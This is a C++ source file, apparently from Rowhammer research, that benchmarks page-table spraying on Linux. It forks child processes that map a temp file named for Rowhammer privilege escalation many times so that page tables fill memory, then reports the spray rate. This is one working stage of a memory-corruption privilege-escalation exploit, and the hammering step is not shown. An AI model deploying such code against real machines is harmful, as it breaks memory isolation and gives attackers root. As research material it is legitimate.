#include "../../common/common.h"

#include <algorithm>
#include <asm/unistd.h>
#include <cassert>
#include <cerrno>
#include <climits>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <ctime>
#include <execinfo.h>
#include <fcntl.h>
#include <iostream>
#include <linux/perf_event.h>
#include <math.h>
#include <sched.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/sysinfo.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

// we need three children, each one can create 1GB of page tables
constexpr int g_child_count = 1;

static int g_child_id = 0;

static size_t g_file_size;
static int    g_temp_file_fd;

static uintptr_t g_victim_phys_addr;

static int g_spraying_pagetables;
static int g_child_pids[g_child_count];
static int g_write_pipes[g_child_count][2];
static int g_read_pipes[g_child_count][2];

static void **g_file_mappings;

static void write_to_parent(const int pipe, const char *buf, int len) {
    int re = write(pipe, buf, len);
    if ( re != len ) {
        printf("Couldn't write to child pipe %d %d %s\n", re, errno, strerror(errno));
    }
}

static void write_to_children(const char *buf, int len) {
    for ( int i = 0; i < g_child_count; i++ ) {
        int re = write(g_write_pipes[i][1], buf, len);
        if ( re != len ) {
            printf("Couldn't write to child pipe %d %d %s\n", re, errno, strerror(errno));
        }
    }
}

static int wait_for_children(char *buf, int len) {
    int re = read(g_read_pipes[0][0], buf, len);

    if ( re == -1 ) {
        printf("Couldn't read from child pipe %d %d %s\n", re, errno, strerror(errno));
    }

    return re;
}

static int spray_page_tables(int iterations) {
    // and now map the file very often and hope that a page table is put in our
    // victim page

    if ( g_child_id != 0 ) {
        g_file_mappings = (void **)malloc(iterations * sizeof(void *));
        if ( g_file_mappings == nullptr ) {
            return 0;
        }
    }

    g_spraying_pagetables = 1;

    uint64_t xor_ = 0;

    int iteration = -1;

    for ( int i = (g_child_id == 0) ? 1 : 0; i < iterations && g_spraying_pagetables; i++ ) {
        iteration = i;

        g_file_mappings[i] = mmap(NULL, g_file_size, PROT_READ | PROT_WRITE, MAP_SHARED, g_temp_file_fd, 0);

        if ( g_file_mappings[i] == MAP_FAILED ) {
            iteration--;
            break;
        }

        for ( size_t j = 0; j < g_file_size / 8; j += 0x1000 / 8 ) {
            xor_ ^= ((volatile uint64_t *)(g_file_mappings[i]))[j];
        }
    }

    g_spraying_pagetables = 0;

    return iteration;
}

static int child_process(int read_pipe, int write_pipe, int temp_file_fd, size_t file_size, uintptr_t victim_phys_addr,
                         int child_id) {
    int  run = 1;
    char pipe_buf[PIPE_BUF];
    int  ret;

    int iterations = 0;

    g_temp_file_fd     = temp_file_fd;
    g_victim_phys_addr = victim_phys_addr;
    g_child_id         = child_id;
    g_file_size        = file_size;

    do {

        ret = read(read_pipe, pipe_buf, PIPE_BUF);

        if ( strncmp(pipe_buf, "spray", 5) == 0 && ret >= 9 ) {
            iterations = *((int *)(pipe_buf + 6));

            iterations = spray_page_tables(iterations);

            write_to_parent(write_pipe, "done", 5);
        }
        else if ( strncmp(pipe_buf, "unmap", 5) == 0 ) {
            for ( int i = 1; i < iterations; i++ ) {
                munmap(g_file_mappings[i], g_file_size);
            }

            write_to_parent(write_pipe, "done", 5);
        }
        else if ( strncmp(pipe_buf, "exit", 4) == 0 ) {

            for ( int i = 0; i < iterations; i++ ) {
                munmap(g_file_mappings[i], g_file_size);
            }
            run = 0;
        }

    } while ( run );

    return 0;
}

static void spawn_spray_children(char *path) {

    for ( int i = 0; i < g_child_count; i++ ) {
        if ( pipe2(g_write_pipes[i], O_DIRECT) == -1 ) {
            printf("couldn't create pipe for child %d %s\n", errno, strerror(errno));
            exit(EXIT_FAILURE);
        }

        if ( pipe2(g_read_pipes[i], O_DIRECT) == -1 ) {
            printf("couldn't create pipe for child %d %s\n", errno, strerror(errno));
            exit(EXIT_FAILURE);
        }

        g_child_id++;

        int pid = fork();

        if ( pid == -1 ) {
            printf("Couldn't fork %d %s\n", errno, strerror(errno));
        }
        else if ( pid == 0 ) {

            char file_name[256], s_child[32], s_read_pipe[32], s_write_pipe[32], s_temp_file_fd[32],
                s_temp_file_size[32], s_victim_phys_addr[32], s_child_id[32];

            snprintf(file_name, sizeof(file_name), "%s", path);
            snprintf(s_child, sizeof(s_child), "child");
            snprintf(s_read_pipe, sizeof(s_read_pipe), "%d", g_write_pipes[i][0]);
            snprintf(s_write_pipe, sizeof(s_write_pipe), "%d", g_read_pipes[i][1]);
            snprintf(s_temp_file_fd, sizeof(s_temp_file_fd), "%d", g_temp_file_fd);
            snprintf(s_temp_file_size, sizeof(s_temp_file_size), "%ld", g_file_size);
            snprintf(s_victim_phys_addr, sizeof(s_victim_phys_addr), "%ld", g_victim_phys_addr);
            snprintf(s_child_id, sizeof(s_child_id), "%d", g_child_id);

            execl(path, file_name, s_child, s_read_pipe, s_write_pipe, s_temp_file_fd, s_temp_file_size,
                  s_victim_phys_addr, s_child_id, (char *)nullptr);

            exit(0);
        }

        g_child_pids[i] = pid;
    }

    g_child_id = 0;
}

static void kill_children() {

    for ( int i = 0; i < g_child_count; i++ ) {
        if ( g_child_pids[i] != 0 )
            kill(g_child_pids[i], SIGTERM);
    }

    if ( g_child_count > 0 && g_child_pids[0] != 0 )
        sleep(2);

    for ( int i = 0; i < g_child_count; i++ ) {
        if ( g_child_pids[i] != 0 ) {
            int status;
            if ( waitpid(g_child_pids[i], &status, WNOHANG) != g_child_pids[i] )
                kill(g_child_pids[i], SIGKILL);
        }
    }
}

int main(int argc, char *argv[]) {

    if ( argc > 2 && strcmp(argv[1], "child") == 0 ) {
        int       read_pipe, write_pipe, temp_file_fd, child_id;
        uintptr_t victim_phys_addr;
        size_t    temp_file_size;

        if ( argc != 8 ) {
            printf("not 8 arguments!\n");
            exit(255);
        }

        // kill me when the parent dies
        prctl(PR_SET_PDEATHSIG, SIGTERM);

        sscanf(argv[2], "%d", &read_pipe);
        sscanf(argv[3], "%d", &write_pipe);
        sscanf(argv[4], "%d", &temp_file_fd);
        sscanf(argv[5], "%ld", &temp_file_size);
        sscanf(argv[6], "%ld", &victim_phys_addr);
        sscanf(argv[7], "%d", &child_id);

        exit(child_process(read_pipe, write_pipe, temp_file_fd, temp_file_size, victim_phys_addr, child_id));
    }

    size_t page_table_size = 0x5000000; // 100 MB of page tables

    // - Seaborn
    // Choose a file size.  We want to pick a small value so as not to
    // waste memory on data pages that could be used for page tables
    // instead.  However, if we make the size too small, we'd have to
    // create too many VMAs to generate our target quantity of page
    // tables.
    // On our ARM64 the virtual address space is only 512GB.

    constexpr size_t max_vmas = (1 << 16) - 50;

    size_t target_pt_size;
    size_t target_mapping_size;
    size_t iterations;

    g_file_size = 0x200000;

    for ( ;; ) {
        // Size in bytes of page tables we're aiming to create.
        target_pt_size = page_table_size - g_file_size;
        // Number of 4k page table pages we're aiming to create.
        target_mapping_size = target_pt_size * 512;
        // Number of VMAs we will create.
        iterations = target_mapping_size / g_file_size;
        if ( iterations < max_vmas )
            break;
        g_file_size *= 2;
    }

    constexpr char const *temp_file = "/tmp/temp_file_for_rowhammer_privesc";

    g_temp_file_fd = open(temp_file, O_CREAT | O_RDWR, 0666);
    if ( g_temp_file_fd < 0 ) {
        printf("Couldn't open temp_file %d %s\n", errno, strerror(errno));
        return errno;
    }

    int re = ftruncate(g_temp_file_fd, g_file_size);
    if ( re != 0 ) {
        printf("Couldn't ftruncate temp_file %d %s\n", errno, strerror(errno));
        return errno;
    }

    g_file_mappings = (void **)malloc(iterations * sizeof(void *));

    // map the file once
    g_file_mappings[0] = mmap(NULL, g_file_size, PROT_READ | PROT_WRITE, MAP_SHARED, g_temp_file_fd, 0);

    // make sure that we don't get huge pages
    madvise(g_file_mappings[0], g_file_size, MADV_NOHUGEPAGE);

    // populate the pages
    uint64_t id = 0x1234567800000000;
    for ( size_t i = 0; i < g_file_size / 8; i++, id++ ) {
        ((uint64_t *)(g_file_mappings[0]))[i] = id;
    }

    spawn_spray_children(argv[0]);

    // prepare "spray%amount%" for the children
    char pipe_buf[PIPE_BUF];
    strcpy(pipe_buf, "spray");

    *((int *)(pipe_buf + 6)) = iterations;

    uint64_t start = ns();

    write_to_children(pipe_buf, 10);

    iterations = spray_page_tables(iterations);

    wait_for_children(pipe_buf, PIPE_BUF);

    uint64_t end = ns();

    size_t page_tables = iterations * 2 * g_file_size / 0x1000;
    size_t mem_size    = page_tables * 8;

    double MBps = (mem_size * 1000llu * 1000llu * 1000llu) / (double)(1024llu * 1024llu * (end - start));

    printf("Sprayed %ld page tables (%ld byte) in %ld ns = %f MBps\n", page_tables, mem_size, end - start, MBps);

    return 0;
}